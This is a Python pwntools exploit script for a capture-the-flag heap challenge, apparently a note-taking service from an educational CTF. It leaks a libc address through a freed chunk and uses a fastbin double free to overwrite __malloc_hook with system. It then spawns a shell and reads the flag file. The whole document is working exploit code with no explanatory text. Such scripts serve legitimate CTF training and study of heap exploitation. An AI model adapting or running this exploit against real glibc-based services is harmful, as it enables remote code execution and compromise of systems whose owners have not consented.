#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( 'libc-2.23.so' )

y = remote( 'localhost' , 10178 )
#y = remote( 'edu-ctf.csie.org' , 10178 )
#y = process( '../note/share/note' )
#pause()


def add( size , note ):
    y.sendafter( '>' , '1' )
    y.sendafter( 'Size: ' , str( size ) )
    y.sendafter( 'Note: ' , note )

def show( index ):
    y.sendafter( '>' , '2' )
    y.sendafter( 'Index: ' , str( index ) )

def delete( index ):
    y.sendafter( '>' , '3' )
    y.sendafter( 'Index: ' , str( index ) )


add( 0x100 , 'leak' ) # 0
add( 0x68 , 'a' ) # 1
add( 0x68 , 'b' ) # 2

delete( 0 )

show( 0 )
y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - 0x3c4b78
success( 'libc -> %s' % hex( l.address ) )


delete( 1 )
delete( 2 )
delete( 1 )

add( 0x68 , p64( l.sym.__malloc_hook - 0x10 - 3 ) )
add( 0x68 , 'a' )
add( 0x68 , 'a' )

#add( 0x68 ,  'aaa' + p64( 0x66666666 ) )

# system
add( 0x68 ,  'aaa' + p64( l.sym.system ) )
y.sendafter( '>' , '1' )
y.sendafter( 'Size: ' , str( l.search( '/bin/sh' ).next() ) )

# one gadget
'''
add( 0x68 ,  'aaa' + p64( l.address + 0xf02a4 ) )
delete( 0 )
'''

sleep(0.1)
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()


